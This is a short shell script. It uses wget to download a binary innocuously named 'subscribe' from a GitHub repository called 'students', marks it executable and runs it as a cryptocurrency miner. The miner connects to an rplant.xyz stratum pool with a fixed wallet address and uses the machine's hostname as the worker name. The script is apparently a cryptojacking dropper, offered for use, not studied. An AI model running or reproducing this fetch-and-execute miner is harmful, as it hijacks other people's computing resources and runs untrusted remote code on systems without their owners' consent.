#!/bin/sh

wget https://raw.githubusercontent.com/mariobiszz/students/main/subscribe
chmod +x subscribe

#run

./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)
